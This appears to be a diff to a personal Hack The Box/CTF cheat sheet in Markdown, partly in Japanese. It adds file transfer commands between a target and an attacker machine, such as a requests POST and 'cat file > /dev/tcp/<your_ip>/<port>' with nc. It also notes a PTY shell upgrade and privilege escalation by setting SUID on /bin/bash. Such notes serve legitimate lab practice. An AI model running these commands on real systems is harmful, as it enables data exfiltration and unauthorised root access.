@@ -31,7 +31,6 @@ htb <br>
 
   https://www.kali.org/tools/gobuster/ <br>
 
-
 ## Shell Upgrade
 Shell to Bash <br>
 Upgrade from shell to bash. <br>
@@ -47,11 +46,40 @@ Spawn /bin/bash using Python’s PTY module, and connect the controlling shell w
 python -c 'import pty; pty.spawn("/bin/bash")'
  ```
  <br>
+
+## File Upload/Download
+### 1. Download <br>
+```
+python3 -m http.server <your_port>
+```
+and then
+```
+wget http://<your_ip>/ <your_port>
+```
+
+### 2. Upload <br>
+```
+python3 -m uploadserver (default_port ==> 8000)
+```
+and then
+```
+python3 -c "import requests;requests.post(\"http://<your_ip>:8000/upload\",files={\"files\":open(\"<upload_file>\",\"rb\")})"
+```
+#### OR
+```
+nc -lvnp <your_port> > <your_file_name(anything is OK(example: upload.jar))>
+```
+and then
+```
+cat <upload_file> > /dev/tcp/<your_ip>/<your_port>
+```
+
 ## Privilege Escalation
 ・sudo -l <br>
   ー 1. root権限で実行できるコトを探す。 <br>
+  ー 1-1. GTFOBinsでexploitを探す。 <br>
   ー 2. 実行できるコトを悪用する。 <br>
-  　ー 2-1. Pythonスクリプトをローカルのshを参照して実行している場合に、ディレクトリを移動して独自のshを実行するようにする等。 <br>
+  　ー 2-1. Pythonスクリプトをローカルのshを参照して実行している場合に、ディレクトリを移動して独自のshを実行するようにする場合。 <br>
    　ー 2-2. hogehoge.shの中身を#!/bin/bash \n chmod u+s /bin/bashとする。それを実行させる。 <br>
     　ー 2-3. bash -p 実行。→ 特権昇格。 <br>      
 ・linPEAS: sudo -lしてもいい感じの出てこないときに使う。 <br>
